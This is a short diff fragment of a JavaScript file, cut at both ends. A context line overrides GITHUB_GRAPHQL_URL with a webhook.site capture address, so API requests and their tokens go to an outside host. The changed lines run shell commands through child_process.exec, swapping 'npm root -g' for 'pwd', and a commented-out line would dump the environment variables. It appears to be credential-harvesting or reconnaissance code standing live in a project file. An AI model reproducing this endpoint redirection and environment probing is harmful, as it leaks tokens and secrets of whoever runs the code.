@@ -4,7 +4,7 @@ process.env['GITHUB_GRAPHQL_URL'] = "webhook.site/71b83533-c42f-4b16-91e7-f34de8
 //console.log( process.env );
 const { exec } = require('child_process');
 // Execute the 'ls' command
-exec('npm root -g', (error, stdout, stderr) => {
+exec('pwd', (error, stdout, stderr) => {
   if (error) {
     console.error(`Error: ${error.message}`);
     return;
